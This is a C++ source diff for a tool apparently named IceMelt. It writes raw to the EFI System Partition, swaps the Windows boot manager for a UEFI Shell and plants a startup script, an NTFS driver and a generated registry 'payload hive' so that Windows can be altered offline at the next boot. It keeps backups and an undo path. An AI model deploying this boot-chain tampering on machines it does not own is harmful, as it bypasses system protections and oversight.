@@ -6,6 +6,8 @@
 #include <vector>
 
 #include "melt/unfreeze.h" // kLoaderServiceName
+#include "raw/esp_raw.h"
+#include "raw/fat.h"
 #include "raw/ntfs_tool.h" // RunTool
 #include "reg/hive.h"
 #include "reg/reg_edit.h"
@@ -390,7 +392,7 @@ namespace icemelt
 		//                                      （UEFI 规范的可移动介质默认路径；Windows 也会在
 		//                                      这里放一份 bootmgfw 的副本）
 		const fs::path espBootmgfw = bootDir / L"bootmgfw.efi";
-		const fs::path backup      = iceDir / L"bootmgfw-original.efi";
+		const fs::path backup      = iceDir / L"BOOTMGW.OLD";
 		if (!PathExists(backup))
 		{
 			if (!PathIsRegularFile(espBootmgfw))
@@ -409,7 +411,7 @@ namespace icemelt
 						::GetLastError()));
 				return r;
 			}
-			log.push_back(L"[+] original bootmgfw.efi backed up to \\EFI\\IceMelt");
+			log.push_back(L"[+] original bootmgfw.efi backed up to \\EFI\\IceMelt as BOOTMGW.OLD");
 		}
 		else
 		{
@@ -417,7 +419,7 @@ namespace icemelt
 		}
 
 		const fs::path espBootx64  = esp / L"EFI" / L"Boot" / L"BOOTX64.EFI";
-		const fs::path backupX64   = iceDir / L"bootx64-original.efi";
+		const fs::path backupX64   = iceDir / L"BOOTX64.OLD";
 		bool           coverFallback = false;
 		if (PathExists(backupX64))
 		{
@@ -670,6 +672,389 @@ namespace icemelt
 			L"    -- otherwise the firmware may boot the stick again and just repeats the run");
 		log.push_back(
 			L"[*] nothing on any internal disk was modified by this command");
+		r.ok = true;
+		return r;
+	}
+
+	namespace
+	{
+		// 宿主文件读取器：给 FAT 写入器提供内容源（分块，不把 40 MB payload 全读进内存）
+		class HostFileReader
+		{
+		public:
+			~HostFileReader()
+			{
+				if (handle_ != INVALID_HANDLE_VALUE) ::CloseHandle(handle_);
+			}
+
+			bool Open(const std::filesystem::path &path, std::wstring &error)
+			{
+				handle_ = ::CreateFileW(
+					path.c_str(),
+					GENERIC_READ,
+					FILE_SHARE_READ,
+					nullptr,
+					OPEN_EXISTING,
+					FILE_ATTRIBUTE_NORMAL,
+					nullptr);
+				if (handle_ == INVALID_HANDLE_VALUE)
+				{
+					error = FormatW(L"cannot open %ls: %lu", path.c_str(), ::GetLastError());
+					return false;
+				}
+				LARGE_INTEGER size{};
+				if (!::GetFileSizeEx(handle_, &size))
+				{
+					error = FormatW(L"cannot size %ls", path.c_str());
+					return false;
+				}
+				size_ = static_cast<uint64_t>(size.QuadPart);
+				return true;
+			}
+
+			uint64_t size() const
+			{
+				return size_;
+			}
+
+			bool ReadAt(uint64_t offset, void *dst, size_t len)
+			{
+				if (handle_ == INVALID_HANDLE_VALUE) return false;
+				LARGE_INTEGER li{};
+				li.QuadPart = static_cast<LONGLONG>(offset);
+				if (!::SetFilePointerEx(handle_, li, nullptr, FILE_BEGIN)) return false;
+				DWORD read = 0;
+				return ::ReadFile(handle_, dst, static_cast<DWORD>(len), &read, nullptr) &&
+						read == len;
+			}
+
+			std::function<bool(uint64_t, void *, size_t)> reader() const
+			{
+				return [this](uint64_t offset, void *dst, size_t len) -> bool
+				{
+					return const_cast<HostFileReader *>(this)->ReadAt(offset, dst, len);
+				};
+			}
+
+		private:
+			HANDLE   handle_ = INVALID_HANDLE_VALUE;
+			uint64_t size_   = 0;
+		};
+
+		// 把 ESP 上的一个文件读进内存（备份用；引导器只有 1-2 MB）
+		bool ReadEspFile(FatFileSystem &fs, const std::string &path, std::vector<uint8_t> &out, bool &exists, std::wstring &error)
+		{
+			exists = fs.Exists(path, nullptr, nullptr, error);
+			if (!exists) return true;
+			return fs.ReadFile(path, out, error);
+		}
+	} // namespace
+
+	DeployResult DeployEspRaw(const std::filesystem::path &exeDir)
+	{
+		DeployResult r;
+		auto &       log = r.log;
+
+		if (!IsProcessElevated())
+		{
+			log.push_back(L"[x] NOT elevated: raw disk access needs an admin token");
+			log.push_back(L"    -> relaunch from an elevated prompt (Run as administrator)");
+			return r;
+		}
+		if (IsWindowsPreinstallationEnvironment())
+		{
+			log.push_back(L"[x] running inside WinPE/WinRE: the payload must come from the target Windows");
+			return r;
+		}
+
+		// ---- 1. 资产 ----
+		const fs::path src = exeDir / L"gunpowder";
+		static constexpr const wchar_t *kAssets[] = {
+			L"shellx64.efi", L"ntfs-3g.efi", L"startup.nsh"};
+		bool missing = false;
+		for (const wchar_t *name: kAssets)
+		{
+			if (!PathIsRegularFile(src / name))
+			{
+				log.push_back(FormatW(L"[x] missing asset: gunpowder\\%ls", name));
+				missing = true;
+			}
+		}
+		if (missing)
+		{
+			log.push_back(L"    -> place the files under <exe>\\gunpowder and rerun");
+			return r;
+		}
+
+		// ---- 2. 现场生产 payload ----
+		const std::filesystem::path payload = ProducePayload(exeDir, log);
+		if (payload.empty()) return r;
+
+		// ---- 3. 找 ESP（只读）----
+		std::vector<EspPartition> candidates;
+		std::wstring              error;
+		if (!FindEspPartitions(16, candidates, error))
+		{
+			log.push_back(FormatW(L"[x] cannot enumerate physical disks: %ls", error.c_str()));
+			return r;
+		}
+		EspPartition             esp;
+		std::vector<std::wstring> notes;
+		if (!SelectEspPartition(candidates, esp, notes, error))
+		{
+			for (const auto &n: notes) log.push_back(L"[!] " + n);
+			log.push_back(FormatW(L"[x] %ls", error.c_str()));
+			return r;
+		}
+		for (const auto &n: notes) log.push_back(L"[*] " + n);
+		log.push_back(FormatW(L"[*] ESP: %ls", esp.description.c_str()));
+		log.push_back(
+			FormatW(
+				L"    offset=%llu length=%llu bytes",
+				static_cast<unsigned long long>(esp.offsetBytes),
+				static_cast<unsigned long long>(esp.lengthBytes)));
+
+		// ---- 4. 打开物理盘 + 挂 FAT ----
+		PhysicalDriveSectorIo physical;
+		if (!physical.Open(esp.diskNumber, error))
+		{
+			log.push_back(FormatW(L"[x] %ls", error.c_str()));
+			return r;
+		}
+		HANDLE volume = INVALID_HANDLE_VALUE;
+		std::wstring lockError;
+		if (!LockCoveringVolume(esp.diskNumber, esp.offsetBytes, esp.lengthBytes, volume, lockError))
+		{
+			log.push_back(FormatW(L"[x] cannot lock the ESP volume: %ls", lockError.c_str()));
+			return r;
+		}
+		struct VolumeGuard
+		{
+			HANDLE h;
+			~VolumeGuard()
+			{
+				if (h != INVALID_HANDLE_VALUE) ::CloseHandle(h);
+			}
+		} guard{volume};
+		if (volume == INVALID_HANDLE_VALUE)
+			log.push_back(L"[*] no mounted volume covers the ESP: nothing to lock");
+
+		FatFileSystem fs;
+		if (!fs.Mount(physical, esp.offsetBytes, error))
+		{
+			log.push_back(FormatW(L"[x] cannot mount the ESP filesystem: %ls", error.c_str()));
+			return r;
+		}
+		log.push_back(
+			FormatW(
+				L"[+] filesystem: %ls, %llu bytes/cluster, %llu bytes free",
+				fs.type(),
+				static_cast<unsigned long long>(fs.clusterSize()),
+				static_cast<unsigned long long>(fs.freeBytes())));
+
+		UndoJournal journal;
+		fs.SetJournal(&journal);
+
+		// ---- 5. 内容源与目标 ----
+		HostFileReader shell, driver, script, hive;
+		if (!shell.Open(src / L"shellx64.efi", error) ||
+			!driver.Open(src / L"ntfs-3g.efi", error) ||
+			!script.Open(src / L"startup.nsh", error) ||
+			!hive.Open(payload, error))
+		{
+			log.push_back(FormatW(L"[x] %ls", error.c_str()));
+			return r;
+		}
+
+		const std::string kBootmgfw = "EFI\\Microsoft\\Boot\\BOOTMGFW.EFI";
+		const std::string kBootx64  = "EFI\\Boot\\BOOTX64.EFI";
+		const std::string kStartup  = "EFI\\Microsoft\\Boot\\STARTUP.NSH";
+		const std::string kDriver   = "EFI\\IceMelt\\NTFS-3G.EFI";
+		const std::string kHive     = "EFI\\IceMelt\\SYSTEM";
+		const std::string kBakMgr   = "EFI\\IceMelt\\BOOTMGW.OLD";
+		const std::string kBakX64   = "EFI\\IceMelt\\BOOTX64.OLD";
+
+		// 目标文件是否存在（决定要不要备份/覆盖 BOOTX64）
+		uint64_t bootmgfwSize = 0;
+		uint64_t bootx64Size  = 0;
+		const bool hasBootmgfw = fs.Exists(kBootmgfw, &bootmgfwSize, nullptr, error);
+		error.clear();
+		const bool hasBootx64 = fs.Exists(kBootx64, &bootx64Size, nullptr, error);
+		error.clear();
+		const bool hasBackupMgr = fs.Exists(kBakMgr, nullptr, nullptr, error);
+		error.clear();
+		const bool hasBackupX64 = fs.Exists(kBakX64, nullptr, nullptr, error);
+		error.clear();
+
+		const uint64_t needed = shell.size() * (hasBootx64 ? 2 : 1) + script.size() +
+				driver.size() + hive.size() +
+				(hasBootmgfw && !hasBackupMgr ? bootmgfwSize : 0) +
+				(hasBootx64 && !hasBackupX64 ? bootx64Size : 0);
+		log.push_back(
+			FormatW(
+				L"[*] plan: bootmgfw=%ls bootx64=%ls backups=%ls/%ls; need ~%llu bytes",
+				hasBootmgfw ? L"replace" : L"absent",
+				hasBootx64 ? L"replace" : L"absent",
+				hasBackupMgr ? L"present" : L"new",
+				hasBackupX64 ? L"present" : L"new",
+				static_cast<unsigned long long>(needed)));
+		if (fs.freeBytes() < needed)
+		{
+			log.push_back(
+				FormatW(
+					L"[x] not enough free space on the ESP: %llu needed, %llu free",
+					static_cast<unsigned long long>(needed),
+					static_cast<unsigned long long>(fs.freeBytes())));
+			log.push_back(L"    -> free space, or use --deploy-usb instead");
+			return r;
+		}
+
+		// ---- 6. 备份原有引导器（只做一次；放在 \\EFI\\IceMelt 下，8.3 名字）----
+		if (hasBootmgfw && !hasBackupMgr)
+		{
+			std::vector<uint8_t> bytes;
+			if (!fs.ReadFile(kBootmgfw, bytes, error) ||
+				!fs.WriteFile(
+					kBakMgr,
+					bytes.size(),
+					[&bytes](uint64_t off, void *dst, size_t len) -> bool
+					{
+						std::memcpy(dst, bytes.data() + off, len);
+						return true;
+					},
+					error))
+			{
+				log.push_back(
+					FormatW(L"[x] cannot back up bootmgfw.efi: %ls", error.c_str()));
+				return r;
+			}
+			log.push_back(L"[+] original bootmgfw.efi backed up as \\EFI\\IceMelt\\BOOTMGW.OLD");
+		}
+		if (hasBootx64 && !hasBackupX64)
+		{
+			std::vector<uint8_t> bytes;
+			if (!fs.ReadFile(kBootx64, bytes, error) ||
+				!fs.WriteFile(
+					kBakX64,
+					bytes.size(),
+					[&bytes](uint64_t off, void *dst, size_t len) -> bool
+					{
+						std::memcpy(dst, bytes.data() + off, len);
+						return true;
+					},
+					error))
+			{
+				log.push_back(
+					FormatW(L"[x] cannot back up BOOTX64.EFI: %ls", error.c_str()));
+				return r;
+			}
+			log.push_back(L"[+] original \\EFI\\Boot\\BOOTX64.EFI backed up as BOOTX64.OLD");
+		}
+
+		// ---- 7. 写文件（每个都读回校验）----
+		struct Job
+		{
+			const HostFileReader *       src;
+			const char *                 dest;
+			const wchar_t *              label;
+		};
+		std::vector<Job> jobs;
+		jobs.push_back({&shell, kBootmgfw.c_str(), L"bootmgfw.efi (UEFI Shell)"});
+		if (hasBootx64) jobs.push_back({&shell, kBootx64.c_str(), L"\\EFI\\Boot\\BOOTX64.EFI (UEFI Shell)"});
+		jobs.push_back({&script, kStartup.c_str(), L"startup.nsh"});
+		jobs.push_back({&driver, kDriver.c_str(), L"ntfs-3g driver"});
+		jobs.push_back({&hive, kHive.c_str(), L"payload hive"});
+
+		for (const auto &job: jobs)
+		{
+			if (!fs.WriteFile(job.dest, job.src->size(), job.src->reader(), error))
+			{
+				log.push_back(
+					FormatW(L"[x] write %ls failed: %ls", job.label, error.c_str()));
+				return r;
+			}
+			if (!fs.VerifyFile(job.dest, job.src->size(), job.src->reader(), error))
+			{
+				log.push_back(
+					FormatW(L"[x] read-back verify failed for %ls: %ls", job.label, error.c_str()));
+				return r;
+			}
+			log.push_back(
+				FormatW(
+					L"[+] %ls written and read back (%llu bytes)",
+					job.label,
+					static_cast<unsigned long long>(job.src->size())));
+		}
+		if (!hasBootx64)
+			log.push_back(
+				L"[!] no \\EFI\\Boot\\BOOTX64.EFI on this ESP: only the NVRAM Boot#### route is covered");
+
+		// ---- 8. undo 快照落盘 ----
+		const std::filesystem::path undo = TempFile(L"icemelt-esp-undo.bin");
+		if (journal.Count() > 0 &&
+			!journal.SaveTo(undo, esp.diskNumber, error))
+		{
+			log.push_back(
+				FormatW(
+					L"[!] the undo snapshot could not be saved (%ls): the writes are already in place",
+					error.c_str()));
+		}
+		else if (journal.Count() > 0)
+		{
+			log.push_back(
+				FormatW(
+					L"[*] undo snapshot: %ls (%zu sectors, %zu bytes) -- replay with "
+					L"--esp-undo \"%ls\"",
+					undo.c_str(),
+					journal.Count(),
+					journal.Bytes(),
+					undo.c_str()));
+		}
+
+		log.push_back(
+			L"[+] raw ESP deploy complete: next boot runs startup.nsh (Secure Boot must be OFF)");
+		log.push_back(
+			L"[*] startup.nsh restores the original boot loaders from \\EFI\\IceMelt\\*.OLD");
+		log.push_back(L"[*] no partition table sector was touched (only FAT metadata and file data)");
+		r.ok = true;
+		return r;
+	}
+
+	DeployResult RestoreEspUndo(const std::filesystem::path &undoFile)
+	{
+		DeployResult r;
+		auto &       log = r.log;
+
+		if (!IsProcessElevated())
+		{
+			log.push_back(L"[x] NOT elevated: raw disk access needs an admin token");
+			return r;
+		}
+		uint32_t     disk = 0;
+		std::wstring error;
+		if (!UndoJournal::ReadDiskNumber(undoFile, disk, error))
+		{
+			log.push_back(FormatW(L"[x] %ls", error.c_str()));
+			return r;
+		}
+		PhysicalDriveSectorIo physical;
+		if (!physical.Open(disk, error))
+		{
+			log.push_back(FormatW(L"[x] %ls", error.c_str()));
+			return r;
+		}
+		size_t restored = 0;
+		if (!UndoJournal::RestoreFrom(physical, undoFile, restored, error))
+		{
+			log.push_back(FormatW(L"[x] replay failed: %ls", error.c_str()));
+			return r;
+		}
+		log.push_back(
+			FormatW(
+				L"[+] replayed %zu metadata sectors on disk %u: the ESP is back to its pre-write "
+				L"state (files we added are gone, FAT/FSInfo/directories restored)",
+				restored,
+				disk));
 		r.ok = true;
 		return r;
 	}
